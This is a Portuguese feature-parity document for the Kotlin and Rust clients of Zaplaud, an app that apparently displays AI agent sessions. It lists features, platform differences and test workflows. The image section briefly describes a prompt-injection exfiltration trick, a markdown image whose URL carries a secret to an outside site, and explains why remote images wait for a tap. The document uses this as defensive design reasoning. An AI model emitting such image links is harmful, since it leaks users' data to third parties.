# Paridade entre os clientes Zaplaud

O Zaplaud tem dois códigos de cliente:

- **Kotlin** (`android/shared/src/commonMain`): Android e iPad (o projeto iOS só tem alvo iPad).
- **Rust** (`zaplaud-rs/`): o desktop de Linux e macOS.

O desktop Compose foi removido em 2026-11-18.

O Habblaud web (`client/`) é a referência de comportamento do servidor, mas tem interface própria.

Regra: uma mudança de comportamento em um cliente Zaplaud entra no outro na mesma entrega. Se não der, a pendência
vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/commonMain/composeResources/values/strings.xml`
(o Rust gera os dele desse arquivo na compilação); só textos que existem apenas no desktop ficam em
`zaplaud-rs/crates/zaplaud-ui/ui/native-strings.xml`. Cores e ícones também saem do Kotlin.

## Recursos

| Recurso | Kotlin | Rust | Observação |
|---|---|---|---|
| Login, vários servidores, relogin por servidor | sim | sim | iPad: trocar temporariamente de app preserva a tela e os campos de login digitados. |
| Abertura da lista sem esperar a resposta dos servidores | sim | sim | Ambos consultam os servidores em paralelo. Servidor sem cookie local válido mostra «Entrar de novo» na hora, sem esperar um 401. |
| Lista: abertas/recentes, busca, filtro por servidor, não lidas, subagentes | sim | sim | Ambos releem Recentes quando uma sessão some do snapshot e não está no histórico. A conversa aberta só fica lida enquanto está na tela, acompanhando o fim, com o app em primeiro plano. Acesso revogado ao reler Recentes fecha a conversa. Histórico retomado passa à sessão ao vivo sem reabrir à mão. |
| Recentes: «Carregar mais», degrau por degrau | sim | sim | Degraus do servidor (`GET /api/sessions/recent?step=N`): 7 dias/150 sessões, 30/300, 90/450 e 365/600. Um degrau para todos os servidores, só em memória (volta ao padrão ao reabrir o app); as releituras usam o degrau atual. O fim da aba mostra «Mostrando os últimos N dias» e o botão enquanto algum servidor, pela última resposta bem-sucedida dele, tem degrau a mais; um servidor que falhou tenta de novo no próximo toque. Se nenhum servidor responder, volta ao degrau anterior com aviso. ZeroClaw: além do padrão, só sessões já espelhadas. |
| Fixar e favoritar sessões, com filtro Favoritas | sim | sim | marcas independentes e locais; fixadas primeiro dentro dos filtros, por atividade; remoção do servidor limpa só suas marcas |
| Conversa com markdown, pensamentos e ferramentas compactos, resumo, ir para o fim | sim | sim | Rust: arrastar seleciona dentro de cada bloco (Slint 1.19); "Selecionar a mensagem toda" no menu para vários blocos. |
| Buscar na conversa aberta | sim | sim | Menu da conversa; desktop também Ctrl+F (Cmd+F no macOS). Sem diferenciar maiúsculas nem acentos; procura no texto completo das mensagens, respostas (inclusive código e respostas recolhidas no resumo) e avisos, sem pensamentos e ferramentas, só no que já está carregado. Conta ocorrências («N de M»), anterior/próximo dão a volta, a conversa rola até a ocorrência (num bloco maior que a tela, até a linha dela) e abre a resposta se estava recolhida. Diagrama Mermaid/SVG com ocorrência mostra o código enquanto a busca está aberta. Destaque: Kotlin pinta o fundo das ocorrências; Rust usa cor e sublinhado (o Slint 1.19 não pinta fundo em trecho de texto) e, no código, a linha. Enquanto a busca está aberta, a conversa não acompanha o fim. |
| Resposta aberta e posição de leitura preservadas ao sair e voltar | sim | sim | estado local por conversa; rolar cancela a restauração; quem saiu acompanhando o fim volta ao fim |
| Cache de conversas com teto de espaço | Android: sim (64 MiB); iPad: **pendente** | sim (64 MiB; limite de 500 entradas por conversa) | Passando do teto, saem primeiro as conversas gravadas há mais tempo; a conversa aberta fica. Conversas removidas do cache são baixadas de novo ao abrir. Kotlin agrupa mudanças em janelas fixas de 3 s. Rust grava expansões na hora e agenda as demais mudanças em 1 s (posição de leitura) ou 3 s (conversa e resumos), sem adiar o prazo pendente. |
| Duas colunas a partir de 840 dp, conversa usando a largura toda | sim | sim | celular: uma coluna |
| Compositor: rascunho, anexos, modos de envio, interrupção, anel de contexto, shake | sim | sim | iPad: o seletor nativo permite marcar mais de cinco arquivos, mas o app recusa a seleção com um aviso. O modo de envio vale o escolhido ao apertar Enviar, mesmo com anexos ainda subindo. Desktop: arrastar arquivos para a janela anexa com as mesmas regras do seletor (X11 e macOS; o Wayland não entrega o arquivo ao app). |
| Aprovação e perguntas, com resumo `text` e entrada não textual em JSON | sim | sim | Kotlin rola na horizontal; Rust quebra a linha e mostra "mais N linhas". Responder pela lista não troca a conversa aberta. |
| Perguntas sem "Outro" | Android: sim; iPad: compartilha o código, não compilado | sim | Página: sim. O servidor exige uma opção e recusa texto livre. |
| Folha de permissão fica aberta durante o envio da decisão | sim | sim | Enquanto envia, botão Cancelar, Esc e clique fora não fecham a folha. |
| Chamar personagem (também com conversa aberta em tela larga), dispensar, retomar | sim | sim | Sessões novas ignoram a pasta aberta e usam `HABBLAUD_CAST_FOLDER` ou, se ausente, a pasta pessoal. Retomar mantém a pasta da conversa retomada. |
| Confirmações de retomar e dispensar fecham ao trocar de conversa ou servidor | sim | sim | A confirmação só vale para o alvo de quando o diálogo abriu. |
| Linha da lista compacta: horário curto ao lado do título, não lidas na linha de baixo, ações sem botão ⋮ | sim | sim | Kotlin: toque longo; desktop: clique direito ou tecla de menu. «Dispensar» também pela lista, só em sessões principais abertas pelo elenco ou por «Novo», sem pedido em andamento. |
| Bate-papo paralelo, sem pular para o fim quando se lê acima | sim | sim | Abre só pelo menu da conversa. Só apaga o rascunho quando o servidor aceita a pergunta. Enquanto houver resposta em curso, uma consulta que falha é repetida após 3 segundos; o próximo sucesso limpa o erro. Enviar ou trocar de tópico volta a acompanhar o fim. Links para arquivos do projeto funcionam como na conversa. |
| Arquivos da pasta de trabalho: navegar e baixar | sim | sim | Android 10+: Downloads (MediaStore); Android 8/9: pasta Downloads com permissão de armazenamento; iPad: pasta do app; desktop: Downloads |
| Entregas da sessão: lista e download | sim | sim | |
| Configurações, papéis, resumos por HTTP | sim | sim | Cotas, papéis e resumos carregam de forma independente: a falha de um não esconde os outros. Servidor omp sem resumidor mostra como ativar o Tiny. |
| Acesso por servidor em Configurações | sim | sim | Mostra conversas, mensagens, aprovações e arquivos. Campo ausente não vira bloqueio; mensagens sem proteção de sessão aparecem bloqueadas com um aviso. |
| Seletores de modelo: nomes normalizados, busca, OpenRouter por fabricante e preservação do modelo atual | sim | sim | sessão e papéis; datas e variantes distinguem rótulos sem alterar o ID escolhido. Sem busca, cada provedor mostra só a versão mais nova de cada família e «Ver mais (N)» abre as antigas; com busca, todas as que casam. A busca aparece sempre, mesmo em catálogos pequenos. |
| ZeroClaw: controles permitidos, sem anel de contexto, elenco pelo runtime | sim | sim | |
| Espera de `Retry-After` no login limitada a 24 h | sim | sim | |
| Status HTTP preservado quando o corpo de erro é truncado | sim (streams: 401, 403, 404 e 500) | sim | No Rust, vale para chamadas HTTP e para a abertura de streams SSE; no Kotlin, para a abertura de streams. |
| Notificação prioriza a conversa do aviso sobre a última conversa de outro servidor | sim (Android) | sim | «Abrir» cancela a restauração dos outros servidores e abre a sessão do aviso assim que estiver na lista, também quando ela só aparece ao reler Recentes. |
| Avisos de aprovação, pergunta, espera no terminal e fim de turno | Android: sim; iPad: sem avisos | sim | SSE com fallback por snapshot, aviso por sessão, agrupamento, filtro de turnos curtos e convite inicial. Android retoma após atualização ou primeiro desbloqueio depois do reinício, sujeito às restrições do aparelho; desktop só avisa com o app aberto. |
| Cota semanal no fim da lista | sim | sim | Compacta: uma linha por provedor com nome, barra curta e percentual da janela de 7 dias mais usada entre as contas dos servidores; a renovação fica só no rótulo de acessibilidade. Cota de tenant aparece como «XLinx» (`ompProvider`), não com o nome da conta. |
| Ícone na bandeja | não se aplica | sim | |
| Chaveiro destrancado quando o padrão está trancado (Linux) | não se aplica | sim | |
| Diagramas Mermaid desenhados na conversa | sim | sim | Kotlin pede o SVG ao servidor (`POST /api/mermaid`); Rust desenha localmente (`mermaid-rs-renderer`). Nos dois, só blocos fechados, linguagem sem diferenciar maiúsculas, e até 20.000 unidades UTF-16; Rust também recusa desenho com mais de 6.000 px de altura natural, que fica como código |
| Diagrama Mermaid em tela cheia, com zoom e arrasto | sim | sim | Kotlin: pinça; desktop: botões +/− e teclado +/−, até 8×; arrasto move, duplo clique/toque restaura, Esc ou Fechar sai |
| Detalhes da sessão e do subagente: seções Estado, Modelo, Contexto e Identificadores; campos vazios ocultos | sim | sim | subagente mostra papel, tarefa, modelo e contexto próprios, atualizados a cada snapshot, e leva à sessão principal; identificadores copiáveis |
| Lista de tarefas do agente | sim | sim | A folha mostra as fases e os estados; a conversa mostra o progresso acima do compositor. |
| Painel flutuante de tarefas sobre a conversa | sim | sim | O toque ou clique no progresso abre e fecha o painel, que fica aberto ao trocar de conversa. |
| Subtítulo da conversa: personagem, pasta, modelo sem provedor nem fornecedor, raciocínio | sim | sim | O estado fica na linha de atividade. Mesma lista de fornecedores (`shortModel` / `short_model`). |
| Copiar bloco de código, código do Mermaid e mensagem inteira | sim | sim | |
| Tentar de novo após erro de envio | sim | sim | Envio ambíguo continua pedindo confirmação. Conflito de envio ou comando só fecha a conversa de origem. Uma consulta de status antiga não altera a operação seguinte. |
| Blocos `svg` desenhados na conversa, com a mesma tela cheia | sim | sim | desenho local nos dois; `var(--fg)`, `--accent` etc. viram cores fixas sobre fundo branco; só blocos fechados; Kotlin aceita até 200.000 caracteres e Rust até 200.000 bytes e 6.000 px de altura natural |
| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem credenciais nem redirecionamentos; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado, inclusive por referência (`![x][ref]`). URL solta sem `<>` vira link nos dois, fora de código. |
| GIF animado | sim (Android 9 ou superior); iPad só o primeiro quadro | sim | Toca em loop só enquanto visível na conversa ou em tela cheia; acima de 300 quadros ou 50 MB decodificados, mostra só o primeiro quadro. Android: com «Remover animações», só após toque (o desktop não tem preferência de movimento reduzido). iPad bloqueado: falta ambiente Mac ou CI para compilar. |
| Links para arquivos do projeto | sim | sim | O servidor troca o destino relativo à pasta da sessão (`[x](pasta/arte.png)`) pelo caminho absoluto, só se o arquivo existe e `/api/files` o serviria; tocar num arquivo que não é imagem abre a janela de arquivos e baixa; imagem já aparece desenhada. |

### Diagramas no cliente Kotlin

Blocos fechados com linguagem `mermaid`, na conversa e no bate-papo paralelo, são enviados a
`POST /api/mermaid` (`{ "source": "..." }`, até 20.000 caracteres). A rota usa a mesma permissão de
mensagens dos resumos e devolve `image/svg+xml`, ou erro JSON 422 se o diagrama não for válido.
O servidor usa `beautiful-mermaid`, com fundo branco e cores resolvidas para leitores SVG nativos,
sem carregar fontes remotas. Tipos não suportados pela biblioteca continuam como código.

Durante o carregamento, em blocos ainda abertos ou quando o pedido/leitor falha, permanece o bloco
de código padrão. Os últimos 32 SVGs ficam em memória, separados por instância da API; SVG que o leitor
recusa sai do cache. iPadOS usa `decodeToSvgPainter` de Compose Resources; Android usa AndroidSVG porque
Compose Resources 1.12.2 não fornece esse leitor no Android. O AndroidSVG não aceita SVG 2
(`orient="auto-start-reverse"`), por isso o servidor troca esses marcadores pelo equivalente com `orient="auto"`.
Tocar no diagrama abre tela cheia: pinça amplia até 8×, arrastar move, toque duplo volta ao inicial.

### Imagens da conversa

Baixar imagem remota sozinho deixaria texto injetado na resposta do agente vazar dados pela URL
(`![](https://site/?segredo=...)`); por isso a remota espera o toque e usa um cliente HTTP sem credenciais.
Arquivo do host usa a rota e a trava do navegador de arquivos. Se a carga ou a leitura falhar, o link
permanece no texto e o cliente mostra um aviso. Ambos recusam imagens raster acima de 4.096 × 4.096
pixels no total. O Kotlin guarda até 24 MiB de imagens codificadas; o Rust guarda até 64 MiB de imagens
decodificadas por conversa. Kotlin junta as imagens no fim da mensagem; Rust põe cada uma logo abaixo
do parágrafo que a cita.

## Verificação

### Testes automatizados locais

- Kotlin: testes de host com `android/gradlew -p android :shared:testAndroidHostTest`. A instrumentação usa
  `python3 scripts/android-instrumented-ci.py` com emulador isolado. No Mac, `scripts/ios-native-tests.sh` e
  `scripts/ios-smoke.sh` exercitam o simulador.
- Rust: `cargo test --workspace --locked` em `zaplaud-rs/` cobre o workspace e o contrato com o servidor.
  Os roteiros gráficos também podem rodar em X11 via Xvfb.
- Os testes de integração usam o servidor isolado de `scripts/android-smoke.ts`, não a instalação de produção.
  Consulte os resultados registrados no [índice dos planos](../plans/README.md).

### Workflows do GitHub

- [Android](../.github/workflows/android.yml): testes de host, lint e builds debug e release; instrumentação em
  emulador API 35 quando há KVM, com artefatos de diagnóstico.
- [iPadOS](../.github/workflows/ios.yml): build, testes nativos e smoke no simulador Apple Silicon; IPA sem assinatura.
- [Zaplaud Rust](../.github/workflows/zaplaud-rs.yml): testes do workspace e do contrato, roteiros de conversa,
  teclado e acessibilidade nos dois temas em Xvfb e, fora de pull requests, empacotamento Linux.
- [CI](../.github/workflows/ci.yml): tipos, traduções TypeScript, testes e build do projeto Node no Ubuntu e no Windows.
  O gate de traduções não verifica Markdown.

### Conferência manual pendente

- Aparelho físico: atualização Android sobre uma instalação anterior; no iPad, instalação, VoiceOver,
  persistência após reassinatura, atualização e renovação pelo SideStore, e convivência com Tailscale.
- Desktop real: sessão Wayland, persistência no chaveiro Linux e funcionamento da bandeja no ambiente de uso.
  O CI Rust não testa macOS.
- Entregas: falta conferir a lista e os downloads com entregas reais no cliente móvel e no desktop.
